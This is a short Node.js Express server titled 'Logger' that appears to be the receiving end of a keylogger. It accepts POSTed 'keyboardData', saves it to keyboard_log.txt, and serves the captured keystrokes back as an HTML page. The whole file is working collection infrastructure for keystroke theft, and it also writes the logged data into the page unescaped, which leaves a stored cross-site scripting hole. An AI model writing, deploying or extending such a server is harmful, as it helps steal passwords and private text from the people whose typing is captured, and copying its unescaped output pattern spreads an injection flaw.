const fs = require("fs");
const express = require("express");
const bodyparser = require("body-parser");

const app = express();

app.use(bodyparser.json({extended: true}));

const port = 8080;

app.get("/", (req, res) => {
    try {
        const file = fs.readFileSync("./keyboard_log.txt", {encoding: 'utf8', flag: 'r'});
        res.send(`<h1>Logger</h1><p>${file.replace("\n", "<br>")}</p>`);
    } catch {
        res.send("<h1>Nothing logged</h1>");
    }
});

app.post("/", (req, res) => {
    console.log(req.body.keyboardData);
    fs.writeFileSync("keyboard_log.txt", req.body.keyboardData);
    res.send("[+] Successfully set data.")
});

app.listen(port, () => {
    console.log(`[-] Listening on port ${port}`);
})